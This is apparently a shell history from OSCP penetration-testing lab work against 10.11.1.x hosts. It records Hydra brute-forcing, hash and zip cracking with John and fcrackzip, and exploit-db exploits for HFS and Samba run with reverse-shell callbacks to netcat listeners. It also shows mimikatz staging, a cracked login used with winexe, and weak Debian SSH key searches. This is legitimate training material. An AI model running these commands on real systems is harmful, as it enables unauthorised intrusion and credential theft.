 1206  2020-08-29 21:51  /usr/sbin/john  --wordlist=otrscewl.txt --rules --stdout >  mutated.txt
 1207  2020-08-29 21:51  vim mutated.txt
 1208  2020-08-29 21:52  cargo
 1209  2020-08-29 21:52  rust
 1210  2020-08-29 21:54  hydra -L root@localhost -P mutated.txt -e nsr -s 80 -o "/home/kali/OSCP/results/10.11.1.39/scans/tcp_80_http_auth_hydra.txt" http://10.11.1.39/otrs/index.pl
 1211  2020-08-29 21:54  hydra -L root@localhost -P mutated.txt -e nsr -s 80 -o "/home/kali/OSCP/results/10.11.1.39/scans/tcp_80_http_auth_hydra.txt" http-get://10.11.1.39/otrs/index.pl
 1212  2020-08-29 21:54  hydra -L "root@localhost" -P mutated.txt -e nsr -s 80 -o "/home/kali/OSCP/results/10.11.1.39/scans/tcp_80_http_auth_hydra.txt" http-get://10.11.1.39/otrs/index.pl
 1213  2020-08-29 21:54  hydra -h
 1214  2020-08-29 21:55  hydra -l root@localhost -P mutated.txt -e nsr -s 80 -o "/home/kali/OSCP/results/10.11.1.39/scans/tcp_80_http_auth_hydra.txt" http-get://10.11.1.39/otrs/index.pl
 1215  2020-08-29 21:56  vim tcp_80_http_auth_hydra.txt
 1216  2020-08-29 22:03  cewl https://otrs.com  --write nolimit.txt
 1217  2020-08-29 22:07  vim nolimit.txt
 1218  2020-08-29 22:07  /usr/sbin/john  --wordlist=nolimit.txt --rules --stdout >  mutatednolimit.txt
 1219  2020-08-29 22:07  vim mutatednolimit.txt
 1220  2020-08-29 22:07  hydra -l root@localhost -P mutatednolimit.txt -e nsr -s 80 -o "/home/kali/OSCP/results/10.11.1.39/scans/tcp_80_http_auth_hydra.txt" http-get://10.11.1.39/otrs/index.pl
 1221  2020-08-29 22:09  cewl http://10.11.1.39/otrs/index.pl  --write indexwl.txt
 1222  2020-08-29 22:09  vim indexwl.txt
 1223  2020-08-29 22:10  /usr/sbin/john  --wordlist=indexwl.txt --rules --stdout >  index.txt
 1224  2020-08-29 22:10  hydra -l root@localhost -P index.txt -e nsr -s 80 -o "/home/kali/OSCP/results/10.11.1.39/scans/tcp_80_http_auth_hydra.txt" http-get://10.11.1.39/otrs/index.pl
 1225  2020-08-29 22:14  mv index.txt indexwl.txt ../exploit
 1226  2020-08-29 22:16  cherrytreeCTF_template.ctb
 1227  2020-08-30 00:02  cd results/10.11.1.39
 1228  2020-08-30 00:26  mv passwd ~/OSCP/8/tmp
 1229  2020-08-30 00:27  ssh hack@10.11.1.39
 1230  2020-08-30 00:31  cat psa
 1231  2020-08-30 00:31  cat passwd
 1232  2020-08-30 00:38  git commit -m "finished .39"
 1233  2020-08-30 04:38  ssudo -s
 1234  2020-08-30 04:44  autorecon  10.11.1.50
 1235  2020-08-30 04:57  vim tcp_8000_https_whatweb.txt
 1236  2020-08-30 04:59  cat tcp_8000_sslscan.txt
 1237  2020-08-30 05:11  cat tcp_8000_sslscan.txt\n
 1238  2020-08-30 05:22  mkdir it_dept
 1239  2020-08-30 05:25  cat network.txt
 1240  2020-08-30 06:08  ccd 10.11.1.71
 1241  2020-08-30 06:10  cd scnas
 1242  2020-08-30 06:29  cd results/10.11.1.50/scans
 1243  2020-08-30 06:37  curl http://10.11.1.50
 1244  2020-08-30 07:08  locate / | grep exploit.exe
 1245  2020-08-30 07:08  sudo i686-w64-mingw32-gcc /usr/share/exploitdb/exploits/windows_x86/local/40627.c -o  exploit.exe
 1246  2020-08-30 07:10  locate / | grep bank
 1247  2020-08-30 07:15  find zip2john
 1248  2020-08-30 07:15  find / | grep zip2john
 1249  2020-08-30 07:19  /usr/sbin/zip2john bank-account.zip
 1250  2020-08-30 07:24  /usr/share/kali-menu/applications/kali-fcrackzip.desktop
 1251  2020-08-30 07:24  sudo /usr/share/kali-menu/applications/kali-fcrackzip.desktop
 1252  2020-08-30 08:04  hashid a8c8b7a37513b7eb9308952b814b522b
 1253  2020-08-30 08:06  /usr/sbin/john  a8c8b7a37513b7eb9308952b814b522b --format=NT
 1254  2020-08-30 08:06  touch alicepasswd.txt
 1255  2020-08-30 08:06  /usr/sbin/john  alicepasswd.txt --format=NT
 1256  2020-08-30 08:12  /usr/sbin/john –format=LM –wordlist=/root/usr/share/john/password_john.txt alicepasswd.txt
 1257  2020-08-30 08:12  /usr/sbin/john –format=NT –wordlist=/root/usr/share/john/password_john.txt alicepasswd.txt
 1258  2020-08-30 08:12  /usr/sbin/john –-format=LM –wordlist=/root/usr/share/john/password_john.txt alicepasswd.txt
 1259  2020-08-30 08:12  /usr/sbin/john --format=LM –wordlist=/root/usr/share/john/password_john.txt alicepasswd.txt
 1260  2020-08-30 08:12  /usr/sbin/john --format=LM -wordlist=/root/usr/share/john/password_john.txt alicepasswd.txt
 1261  2020-08-30 08:12  sudo /usr/sbin/john --format=LM -wordlist=/root/usr/share/john/password_john.txt alicepasswd.txt
 1262  2020-08-30 08:14  cd /usr/share/wordlists
 1263  2020-08-30 08:14  rockyou.txt.gz
 1264  2020-08-30 08:14  tar rockyou.txt.gz
 1265  2020-08-30 08:15  unzip rockyou.txt.gz
 1266  2020-08-30 08:15  gunzip  rockyou.txt.gz
 1267  2020-08-30 08:15  sudo gunzip  rockyou.txt.gz
 1268  2020-08-30 08:16  cd ~/OSCP/5
 1269  2020-08-30 08:16  sudo /usr/sbin/john --format=LM -wordlist=/usr/share/wordlists/rockyou.txt alicepasswd.txt
 1270  2020-08-30 08:17  sudo /usr/sbin/john --format=NT -wordlist=/usr/share/wordlists/rockyou.txt alicepasswd.txt
 1271  2020-08-30 08:23  ccat alicepasswd.txt
 1272  2020-08-30 08:24  sudo /usr/sbin/john --format=NT alicepasswd.txt
 1273  2020-08-30 08:27  hascat
 1274  2020-08-30 08:28  /usr/share/metasploit-framework/lib/metasploit/framework/password_crackers/hashcat
 1275  2020-08-30 08:34  john --format=NT --rules -w=/usr/share/wordlists/rockyou.txt alicepasswd.txt
 1276  2020-08-30 08:34  /usr/share/john --format=NT --rules -w=/usr/share/wordlists/rockyou.txt alicepasswd.txt
 1277  2020-08-30 08:34  /usr/sbin/john --format=NT --rules -w=/usr/share/wordlists/rockyou.txt alicepasswd.txt
 1278  2020-08-30 09:07  john --format=NT --show alicepasswd.txt
 1279  2020-08-30 09:07  /usr/sbin/john --format=NT --show alicepasswd.txt
 1280  2020-08-30 09:10  john --format=nt alicepasswd.txt --show
 1281  2020-08-30 09:10  /usr/sbin/john --format=nt alicepasswd.txt --show
 1282  2020-08-30 09:11  /usr/sbin/john --format=NT alicepasswd.txt --show
 1283  2020-08-30 10:59  cd scna
 1284  2020-08-30 10:59  tcp_135_rpc_nmap.txt
 1285  2020-08-30 11:00  d ..
 1286  2020-08-30 11:00  cat _full_tcp_nmap.txt 
 1287  2020-08-30 19:21  autorecon  10.11.1.136
 1288  2020-08-30 19:22  locate / | grep fcrackzip
 1289  2020-08-30 19:23  sudo apt-get install fcrackzip\n
 1290  2020-08-30 19:25  fcrackzip
 1291  2020-08-30 19:26  fcrackzip bank-account.zip
 1292  2020-08-30 19:32  fcrackzip -v -u -D -p /home/pentaroot/rockyou.txt bank-account.zip
 1293  2020-08-30 19:33  #/usr/sbin/john --format=NT --rules -w=/usr/share/wordlists/rockyou.txt alicepasswd.txt
 1294  2020-08-30 19:33  fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip
 1295  2020-08-30 19:33  unzip bank-account.zip
 1296  2020-08-30 19:34  vim bank-account.xls\n
 1297  2020-08-30 19:35  open bank-account.xls
 1298  2020-08-30 19:35  strings bank-account.xls
 1299  2020-08-30 19:40  cat alicepasswd.txt
 1300  2020-08-30 19:42  /usr/sbin/john   -w=/usr/share/wordlists/rockyou.txt alicepasswd.txt
 1301  2020-08-30 19:43  /usr/sbin/john --format=LM --rules -w=/usr/share/wordlists/rockyou.txt alicepasswd.txt
 1302  2020-08-30 19:49  touch alicenewhash.txt
 1303  2020-08-30 19:49  vim alice
 1304  2020-08-30 19:49  vim alicenewhash.txt
 1305  2020-08-30 19:50  /usr/sbin/john --format=LM --rules -w=/usr/share/wordlists/rockyou.txt alicenewhash.txt
 1306  2020-08-30 19:52  cd results/10.11.1.31
 1307  2020-08-30 19:53  rpcclient -p 49667 -U alice 10.11.1.5
 1308  2020-08-30 19:53  rpcclient -p 49667 -U "alice" 10.11.1.5
 1309  2020-08-30 19:54  cat alicenewhash.txt
 1310  2020-08-30 19:54  /usr/sbin/john --format=NT --rules -w=/usr/share/wordlists/rockyou.txt alicenewhash.txt
 1311  2020-08-30 19:55  /usr/sbin/john --format=NT --rules -w=/usr/share/wordlists/rockyou.txt alicenewhash.txt\n
 1312  2020-08-30 19:57  vim alicepasswd.txt
 1313  2020-08-30 19:57  touch nativehashalice.txt
 1314  2020-08-30 19:57  vim nativehashalice.txt
 1315  2020-08-30 19:58  /usr/sbin/john -w=/usr/share/wordlists/rockyou.txt nativehashalice.txt
 1316  2020-08-30 20:02  Apt-get install xrdp
 1317  2020-08-30 20:03  sudo apt-get install xrdp
 1318  2020-08-30 20:03  xrdp
 1319  2020-08-30 20:04  Service xrdp-sesman start
 1320  2020-08-30 20:04  sudo service xrdp-sesman start
 1321  2020-08-30 20:04  update-rc.d xrdp enable
 1322  2020-08-30 20:04  sudo update-rc.d xrdp enable
 1323  2020-08-30 20:06  cd results/10.11.1.50
 1324  2020-08-30 20:07  rpcclient -p 135 -U "" 10.11.1.50\n
 1325  2020-08-30 20:07  rpcclient -p 135 -U alice 10.11.1.50\n
 1326  2020-08-30 20:08  touch crackedpasswordalice.txt
 1327  2020-08-30 20:08  vim crackedpasswordalice.txt
 1328  2020-08-30 20:08  /usr/sbin/john --format=NT --rules -w=/usr/share/wordlists/rockyou.txt nativehashalice.txt
 1329  2020-08-30 20:15  curl http://10.11.1.50/\?q\=user/password/
 1330  2020-08-30 20:17  cast tcp_80_http_robots.txt
 1331  2020-08-30 20:19  tcp_9505_http_gobuster.txt
 1332  2020-08-30 20:21  cat tcp_9505_http_index.html
 1333  2020-08-30 20:26  ccserachsploit HttpFileServer httpd\n
 1334  2020-08-30 20:26  serachsploit HttpFileServer httpd\n
 1335  2020-08-30 20:26  searchsploit HttpFileServer httpd\n
 1336  2020-08-30 20:26  searchsploit \n
 1337  2020-08-30 20:26  searchsploit hHttpFileServer\n
 1338  2020-08-30 20:29  cat tcp_9505_http_whatweb.txt
 1339  2020-08-30 20:30  cat tcp_9505_http_nmap.txt
 1340  2020-08-30 20:30  searchsploit HFS 
 1341  2020-08-30 20:31  locate nc.exe
 1342  2020-08-30 20:31  cp /home/kali/OSCP/results/10.11.1.14/exploit/nc.exe ./
 1343  2020-08-30 20:33  python 39161.py rhost rport | nc -lvp 4444\n
 1344  2020-08-30 20:33  python 39161.py rhost rport | nc -lvp 443\n
 1345  2020-08-30 20:33  sudo python 39161.py rhost rport | nc -lvp 443\n
 1346  2020-08-30 20:33  sudo python 39161.py rhost rport | nc -lvp 4444\n
 1347  2020-08-30 20:34  sudo python 39161.py  | nc -lvp 4444\n
 1348  2020-08-30 20:34  vim 39161.py 
 1349  2020-08-30 20:52  python 39161.py 10.11.1.50 80
 1350  2020-08-31 01:42  plink
 1351  2020-08-31 01:53  /usr/share/windows-resources/binaries/plink.exe\n
 1352  2020-08-31 03:10  l;cd 10.11.1.50
 1353  2020-08-31 04:18  l /etc/passwd
 1354  2020-08-31 04:47  cat tcp_9505_http_nikto.txt
 1355  2020-08-31 04:48  cat tcp_9505_http_gobuster.txt
 1356  2020-08-31 04:51  cat 39161.py
 1357  2020-08-31 05:40  git commit -m "WIP"
 1358  2020-08-31 09:17  mkdir test
 1359  2020-08-31 09:17  mv plink.exe test
 1360  2020-08-31 09:41  cd test
 1361  2020-08-31 09:41  cp plink.exe ../
 1362  2020-08-31 09:56  sudo ss -antlp | grep sshd\n
 1363  2020-08-31 09:58  sudo systemctl enable ssh
 1364  2020-08-31 10:01  ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 123.123.123.123\n
 1365  2020-08-31 10:03  sudo systemctl restart sshd
 1366  2020-08-31 10:04  export  ~/.ssh/config
 1367  2020-08-31 10:05  ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 10.11.1.50
 1368  2020-08-31 10:07  service ssh restart\n
 1369  2020-08-31 10:09  sudo vim /etc/ssh/ssh_config\n
 1370  2020-08-31 10:10  cat /home/kali/.ssh/config
 1371  2020-08-31 10:10  vim /home/kali/.ssh/config \n
 1372  2020-08-31 10:11  soruce /home/kali/.ssh/config
 1373  2020-08-31 10:11  source /home/kali/.ssh/config
 1374  2020-08-31 10:12  sudo service ssh restart\n
 1375  2020-08-31 10:13  vim /home/kali/.ssh/config
 1376  2020-08-31 10:13  sudo service sshd restart\n
 1377  2020-08-31 10:15  sudo systemctl restartsdf ssh
 1378  2020-08-31 10:23  ssh-keygen -A
 1379  2020-08-31 10:23  sudo ssh-keygen -A
 1380  2020-08-31 10:25  ssh -o KexAlgorithms=diffie-hellman-group1-sha1 alice@10.11.1.50\n
 1381  2020-08-31 10:25  ssh -o alice@10.11.1.50\n
 1382  2020-08-31 10:37  ssh -Q kex
 1383  2020-08-31 10:39  ssh  alice@10.11.1.50\n
 1384  2020-08-31 10:39  ssh kali 127.0.0.1
 1385  2020-08-31 10:40  Cssh -Q kex\n
 1386  2020-08-31 10:41  ssh kali@127.0.0.1
 1387  2020-08-31 10:42  ssh -Q kex\n
 1388  2020-08-31 10:57  cd /home/kali/OSCP/results/10.11.1.50/exploit/A#
 1389  2020-08-31 10:57  cp plink.exe  /home/kali/OSCP/results/10.11.1.50/exploit/test
 1390  2020-08-31 10:57  cd  /home/kali/OSCP/results/10.11.1.50/exploit/test
 1391  2020-08-31 10:58  mv pl.exe ../
 1392  2020-08-31 11:01  ssh
 1393  2020-08-31 11:03  cat plink.py
 1394  2020-08-31 19:36  vim 39161.py 39161.py
 1395  2020-08-31 19:42  crackmapexec smb 127.0.0.1\nxit
 1396  2020-08-31 19:44  sudo apt-get install -y libssl-dev libffi-dev python-dev build-essential
 1397  2020-08-31 19:45  git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
 1398  2020-08-31 19:46  cd CrackMapExec
 1399  2020-08-31 19:46  python3 setup.py install
 1400  2020-08-31 19:47  sudo python3 setup.py install
 1401  2020-08-31 19:50  psexec 
 1402  2020-08-31 19:53  crackmapexec smb 127.0.0.1  
 1403  2020-08-31 19:58  mv PsExec64.exe PsExec.exe ../OSCP/results/10.11.1.50/exploit
 1404  2020-08-31 19:58  cd ../OSCP/results/10.11.1.50/exploit
 1405  2020-08-31 20:10  winexe
 1406  2020-08-31 20:13  winexe -U 'alice%aliceishere' //10.11.1.50 cmd\n~
 1407  2020-08-31 20:23  root passwd
 1408  2020-08-31 20:23  passwd root
 1409  2020-08-31 20:23  sudo passwd root
 1410  2020-08-31 20:24  sudo  vim /etc/ssh/sshd_config
 1411  2020-08-31 20:25  ~
 1412  2020-08-31 20:25  winexe -U 'alice%aliceishere' //10.11.1.50 cmd
 1413  2020-08-31 20:26  nc -lvp 9505\n
 1414  2020-08-31 20:26  python 39161.py 10.11.1.50 9505
 1415  2020-08-31 20:27  nc -lvp 8080\n
 1416  2020-08-31 21:17  touch proof.txt
 1417  2020-08-31 21:17  vim proof.txt
 1418  2020-08-31 21:19  cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./
 1419  2020-08-31 21:19  vin plink.py
 1420  2020-08-31 21:19  vim plink.py
 1421  2020-08-31 21:20  python plink.py 10.11.1.50 9505
 1422  2020-08-31 21:31  git commit -m "finished 50"
 1423  2020-08-31 21:34  ce exploit
 1424  2020-08-31 21:36  curl -i
 1425  2020-08-31 21:36  curl -i 10.11.1.71
 1426  2020-08-31 21:47  locate / | grep PHP 5.x (< 5.6.2) - Bypass disable_functions (Shellshock Exploit)
 1427  2020-08-31 21:58  searchsploit --colour -t php 5 | grep -vi '/dos/\|\.php[^$]' | grep -i '5\.\(5\|x\)' | \n: 1598911122:0;searchsploit --colour -t php 5 | grep -vi '/dos/\|\.php[^$]' | grep -i '5\.\(5\|x\)' | \\n   grep -vi '/windows/\|PHP-Nuke\|RapidKill Pro\|Gift Registry\|Artiphp CMS'
 1428  2020-09-01 02:08  snmp
 1429  2020-09-01 04:02  cat_manual_commands.txt
 1430  2020-09-01 04:05  smbclient  //10.11.1.136/bob -U ""
 1431  2020-09-01 04:07  smbclient  //10.11.1.136/ob Docs -U ""
 1432  2020-09-01 04:07  smbclient  //10.11.1.136/Bob Docs -U ""
 1433  2020-09-01 04:09  smbclient  //10.11.1.31/IPC -U ""
 1434  2020-09-01 04:11  smbclient  //10.11.1.136/Bob Docs -U ""\n
 1435  2020-09-01 04:16  smbclient  //10.11.1.31/wwwroot -U ""
 1436  2020-09-01 04:21  smbclient  //10.11.1.31/ -U ""
 1437  2020-09-01 04:24  smbclient  //10.11.1.31/Bob Share -U ""
 1438  2020-09-01 04:24  smbclient  //10.11.1.31/BobShare -U ""
 1439  2020-09-01 04:36  .0.24cvim smbclient.py
 1440  2020-09-01 04:45  vim /usr/share/doc/python3-impacket/examples/smbclient.py
 1441  2020-09-01 04:45  python3 /usr/share/doc/python3-impacket/examples/smbclient.py
 1442  2020-09-01 04:45  python3 /usr/share/doc/python3-impacket/examples/smbclient.py -h
 1443  2020-09-01 04:59  smbclient  //10.11.1.136/BobShare -U ""
 1444  2020-09-01 05:02  smbclient  //10.11.1.136/Bob Share -U ""
 1445  2020-09-01 05:02  smbclient  //10.11.1.136/var -U ""
 1446  2020-09-01 05:02  smbclient  //10.11.1.136/ -U ""
 1447  2020-09-01 05:03  smbclient  //10.11.1.136/tmp -U ""
 1448  2020-09-01 05:03  locate / | grep 37834
 1449  2020-09-01 05:03  vim /usr/share/exploitdb/exploits/linux/remote/37834.py\n
 1450  2020-09-01 05:04  cp /usr/share/exploitdb/exploits/linux/remote/37834.py ../exploit\n
 1451  2020-09-01 05:04  vim 37834.py `
 1452  2020-09-01 05:04  vim 37834.py 
 1453  2020-09-01 05:05  ./37834.py 
 1454  2020-09-01 05:05  python 37834.py 
 1455  2020-09-01 05:06  nc -lvp 445
 1456  2020-09-01 05:07  python 37834.py 10.11.1.136 445 192.168.119.217 1234 
 1457  2020-09-01 05:07  python 37834.py 10.11.1.136 445 192.168.119.217 1234 10.11.1.136
 1458  2020-09-01 05:07  python 37834.py 10.11.1.136 445 192.168.119.217 1234 samba_3.6.3-debian6
 1459  2020-09-01 05:07  python 37834.py 10.11.1.136 445 192.168.119.217 1234 00
 1460  2020-09-01 05:09  locate / | grep samba_3.6.3-debian6
 1461  2020-09-01 05:09  diff  /usr/lib/python3/dist-packages/impacket/examples/smbclient.py /usr/share/doc/python3-impacket/examples/smbclient.py
 1462  2020-09-01 05:10  /usr/lib/python3/dist-packages/impacket/examples/smbclient.py
 1463  2020-09-01 05:10  cd results/10.11.1.136
 1464  2020-09-01 05:11  chmod +x cm
 1465  2020-09-01 05:11  chmod +x smbclient.py
 1466  2020-09-01 05:11  python smbclient.py
 1467  2020-09-01 05:11  vimsm
 1468  2020-09-01 05:12  cp /usr/lib/python3/dist-packages/impacket/examples/smbclient.py ./
 1469  2020-09-01 05:12  python3 smbclient.py
 1470  2020-09-01 05:12  python3 smbclient.py l
 1471  2020-09-01 05:12  vim smbclient.py
 1472  2020-09-01 06:15  smbclient  //10.11.1.31/BobShare -U "bob"\n
 1473  2020-09-01 06:15  smbclient  //10.11.1.31/ -U ""\n
 1474  2020-09-01 06:16  smbclient  //10.11.1.31/Bob Share -U ""\n
 1475  2020-09-01 06:25  smbclient  //10.11.1.31/Bob//Share -U ""\n
 1476  2020-09-01 06:25  smbclient  //10.11.1.31/Bob\\Share -U ""\n
 1477  2020-09-01 06:25  smbclient  //10.11.1.31/BobShare -U ""\n
 1478  2020-09-01 06:25  smbclient  //10.11.1.31/tmp-U ""\n
 1479  2020-09-01 06:25  smbclient  //10.11.1.31/tmp -U ""\n
 1480  2020-09-01 06:26  smbclient  //10.11.1.136/Bob//Share -U ""\n
 1481  2020-09-01 06:26  smbclient  //10.11.1.136/Bob -U ""\n
 1482  2020-09-01 06:26  smbclient  //10.11.1.136/bob -U ""\n
 1483  2020-09-01 06:26  smbclient  //10.11.1.136/tmp -U ""\n
 1484  2020-09-01 06:31  smbclient  //10.11.1.136/ -U ""\n
 1485  2020-09-01 06:31  smbclient  //10.11.1.136/bob shares -U ""\n
 1486  2020-09-01 06:37  sudo systemctl restart  ssh
 1487  2020-09-01 06:43  smbclient  //10.11.1.136/BobShare -U ""\n
 1488  2020-09-01 06:44  smbclient  //10.11.1.136/Bob_Share -U ""\n
 1489  2020-09-01 06:52  smbclient  //10.11.1.136/Bob\\Share -U ""\n
 1490  2020-09-01 06:54  journalctl -xe"
 1491  2020-09-01 06:54  journalctl -xe
 1492  2020-09-01 07:09  sudo service smbd restart\n
 1493  2020-09-01 07:09  sudo update
 1494  2020-09-01 09:34  cd Desktop 
 1495  2020-09-01 09:36  dd
 1496  2020-09-01 09:44  smbclient  -L //10.11.1.136/Bob Share -U ""\n
 1497  2020-09-01 09:44  smbclient -L //10.11.1.136/Bob Share -U ""
 1498  2020-09-01 09:45  smbclient -N //10.11.1.136/Bob Share -U ""
 1499  2020-09-01 09:47  smbclient -N //10.11.1.136/"Bob Share" -U ""
 1500  2020-09-01 09:57  vim Contract\ Mr.\ Suzuki.txt
 1501  2020-09-01 09:57  vim Draft\ Contract\ Mr.\ Yamamoto.txt
 1502  2020-09-01 09:59  cd ~/OSCP/results/10.11.1.136/exploit/tobesecured
 1503  2020-09-01 09:59  vim Draft\ Contract\ Mr.\ Yamamoto.txt Draft\ Contract\ Mr.\ Yamamoto.txt
 1504  2020-09-01 10:00  smbclient  //10.11.1.136/Bob Share -U ""\n
 1505  2020-09-01 10:13  strings 'Contract Mr. Suzuki.txt'
 1506  2020-09-01 10:13  strings 'Draft Contract Mr. Yamamoto.txt'
 1507  2020-09-01 10:15  sudo vim /etc/samba/smb.conf 
 1508  2020-09-01 10:17  sudo systemctl restart smbd.service\n
 1509  2020-09-01 10:18  serachsploit \n
 1510  2020-09-01 10:21  searchsploit Samba smbd 3.0.24
 1511  2020-09-01 10:23  searchsploit Samba  3.0.24
 1512  2020-09-01 10:23  searchsploit Samba  3.0
 1513  2020-09-01 10:23  vim Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                                                                                                                          | linux/remote/16859.rb\n
 1514  2020-09-01 10:42  locate / | grep multiple/remote/10095.txt
 1515  2020-09-01 10:45  vim multiple/remote/10095.txt
 1516  2020-09-01 10:45  vim /usr/share/exploitdb/exploits/multiple/remote/10095.txt\n
 1517  2020-09-01 10:47  searchsploit Samba symlink
 1518  2020-09-01 10:48  vim linux/remote/33599.txt
 1519  2020-09-01 18:44  searchsploit Symlink 
 1520  2020-09-01 18:44  mfsconsole
 1521  2020-09-01 18:45  locate / | grep linux/remote/33599.txt
 1522  2020-09-01 18:54  locate / | grep psexec
 1523  2020-09-01 18:54  vim /usr/share/exploitdb/exploits/linux/remote/33599.txt
 1524  2020-09-01 18:55  cp /usr/share/exploitdb/exploits/linux/remote/33599.txt ~/OSCP/results/10.11.1.136/exploit
 1525  2020-09-01 18:55  cd ~/OSCP/results/10.11.1.136/exploit
 1526  2020-09-01 18:55  vim 37834.py
 1527  2020-09-01 18:56  vim smb
 1528  2020-09-01 18:56  gcc smb.c
 1529  2020-09-01 18:56  vim smb.c
 1530  2020-09-01 18:57  vim 33599.txt
 1531  2020-09-01 19:02  locate / | grep  client.c 
 1532  2020-09-01 19:08  mkdir keys 
 1533  2020-09-01 19:09  mv ssh_config blacklist.DSA-1024 blacklist.RSA-2048 moduli ssh_config sshd_config ssh_host_dsa_key.pub ssh_host_rsa_key.pub
 1534  2020-09-01 19:09  mv keys  ssh_config blacklist.DSA-1024 blacklist.RSA-2048 moduli ssh_config sshd_config ssh_host_dsa_key.pub ssh_host_rsa_key.pub
 1535  2020-09-01 19:09  mv key  ssh_config blacklist.DSA-1024 blacklist.RSA-2048 moduli ssh_config sshd_config ssh_host_dsa_key.pub ssh_host_rsa_key.pub
 1536  2020-09-01 19:10  mv   ssh_config blacklist.DSA-1024 blacklist.RSA-2048 moduli ssh_config sshd_config ssh_host_dsa_key.pub ssh_host_rsa_key.pub keys
 1537  2020-09-01 19:10  cd tobesecured
 1538  2020-09-01 19:10  vim ssh_config
 1539  2020-09-01 19:10  awk '{print $2}' ssh_host_ecdsa_key.pub | base64 -d
 1540  2020-09-01 19:12  awk '{print $2}' ssh_host_dsa_key.pub | base64 -d
 1541  2020-09-01 19:16  locate / | grep smbclient.py
 1542  2020-09-01 19:16  vmi /usr/lib/python3/dist-packages/impacket/examples/smbclient.py
 1543  2020-09-01 19:16  vim /usr/lib/python3/dist-packages/impacket/examples/smbclient.py
 1544  2020-09-01 19:22  ssh-keygen -l -f ssh_host_rsa_key.pub -E md5
 1545  2020-09-01 19:25  vim ssh_host_dsa_key.pub
 1546  2020-09-01 19:25  awk '{print $2}' ssh_host_dsa_key.pub | base64 -d | sha1sum | xxd -r -p | base64
 1547  2020-09-01 19:26  cat ssh_host_rsa_key.pub
 1548  2020-09-01 19:26  awk '{print $2}' ssh_host_rsa_key.pub | base64 -d
 1549  2020-09-01 19:28  awk '{print $2}' ssh_host_rsa_key.pub | base64 -d | md5sum
 1550  2020-09-01 19:28  awk '{print $2}' ssh_host_rsa_key.pub | base64 -d | sha1sum
 1551  2020-09-01 19:29  awk '{print $2}' ssh_host_rsa_key.pub | base64 -d | sha256sum
 1552  2020-09-01 19:29  awk '{print $2}' ssh_host_rsa_key.pub | base64 -d | sha1sum | xxd -r -p | base64
 1553  2020-09-01 19:29  awk '{print $2}' ssh_host_rsa_key.pub | base64 -d | sha256sum | xxd -r -p | base64
 1554  2020-09-01 19:35  ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 bob@10.11.1.136 -vvvvv
 1555  2020-09-01 19:46  cat blacklist.DSA-1024
 1556  2020-09-01 19:55  ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 bob@10.11.1.136 
 1557  2020-09-01 19:56  ssh -i 
 1558  2020-09-01 19:56  tax -x
 1559  2020-09-01 19:56  tar -x 
 1560  2020-09-01 19:56  tar -x debian_ssh_dsa_1024_x86.tar.bz2
 1561  2020-09-01 19:58  tar -zxvf debian_ssh_dsa_1024_x86.tar
 1562  2020-09-01 20:00  ssh-keygen -l -f ssh_host_dsa_key.pub
 1563  2020-09-01 20:00  ssh-keygen -l -f ssh_host_rsa_key.pub
 1564  2020-09-01 20:02  8823980d9d8a205935b8141214d5d044
 1565  2020-09-01 20:02  grep 8823980d9d8a205935b8141214d5d044
 1566  2020-09-01 20:03  /home/kali/.cargo/bin/rg  8823980d9d8a205935b8141214d5d044
 1567  2020-09-01 20:03  grep 8823980 ./
 1568  2020-09-01 20:03  grep 8823980 
 1569  2020-09-01 20:05  cd uncommon_keys
 1570  2020-09-01 20:05  tar -xvf debian_ssh_rsa_1024_x86.tar
 1571  2020-09-01 20:06  cd ts
 1572  2020-09-01 20:06  cd rsa
 1573  2020-09-01 20:09  ssh-keygen -l -f ssh_host_dsa_key.pub -E sha256
 1574  2020-09-01 20:10  /home/kali/.cargo/bin/rg  8823980d9
 1575  2020-09-01 20:11  /home/kali/.cargo/bin/rg  ffe5b57d7e0c7b85e797fbdc8e003077-
 1576  2020-09-01 20:11  /home/kali/.cargo/bin/rg  --files ffe5b57d7e0c7b85e797fbdc8e003077-
 1577  2020-09-01 20:12  /home/kali/.cargo/bin/rg  --files ./ffe5b57d7e0c7b85e797fbdc8e003077-
 1578  2020-09-01 20:12  /home/kali/.cargo/bin/rg  --files ./ffe5b57d7e0c7b85e797fbdc8e003077
 1579  2020-09-01 20:12  /home/kali/.cargo/bin/rg  --files ./ ffe5b57d7e0c7b85e797fbdc8e003077
 1580  2020-09-01 20:12  /home/kali/.cargo/bin/rg  --files ./ 8823980d9d8a205935b8141214d5d044
 1581  2020-09-01 20:13  /home/kali/.cargo/bin/rg 
 1582  2020-09-01 20:13  /home/kali/.cargo/bin/rg  8823980d9d8a205935b8141214d5d044 ./
 1583  2020-09-01 20:14  grep 8823980d9d8a205935b8141214d5d044 *
 1584  2020-09-01 20:14  grep -rni "8823980d9d8a205935b8141214d5d044" *\n
 1585  2020-09-01 20:15  locate / | grep 8823980d9d8a205935b8141214d5d044
 1586  2020-09-01 20:15  find  / | grep 8823980d9d8a205935b8141214d5d044
 1587  2020-09-01 20:16  ssh-keygen -l -f ssh_host_dsa_key.pub -E md5
 1588  2020-09-01 20:17  ssh-keygen -l -f ssh_host_dsa_key.pub -E sha1
 1589  2020-09-01 20:20  vim moduli
 1590  2020-09-01 21:00  locaterootfs
 1591  2020-09-01 21:00  locate / | grep rootfs
 1592  2020-09-01 21:02  cd spool
 1593  2020-09-01 21:02  rm -rf spool lib
 1594  2020-09-01 21:03  ssh-dss AAAAB3NzaC1kc3MAAACBAOgzzMCD3Im5bRnAVdV3yLwTsyNAi3IiFShIfx9bUcUNmyFDM7SaFrVBuuIW+2qnDF7vybPiMNI9/dQ7ck2gLUqPu2F4gfXml8W9RKcqTOVksRmQ5s0O4c88mCqV3F1nzKKMSZbK9yYWbafabX91f2SinBQZbfMGv8+R2TyE78LjAAAAFQDXtJ7Pca0RkEBFcBLfPzmCUBpSeQAAAIEAlK4NYlfGt3uInBaKG0kK/N0nZwX7ji++5xSiLLjI/0M9xacdWa
 1595  2020-09-01 21:05  ssh-keygen -l -f authorized_keys -E sha1
 1596  2020-09-01 21:07  /home/kali/.cargo/bin/rg  f1fb2162a02f0f7c40c210e6167f05ca  ./
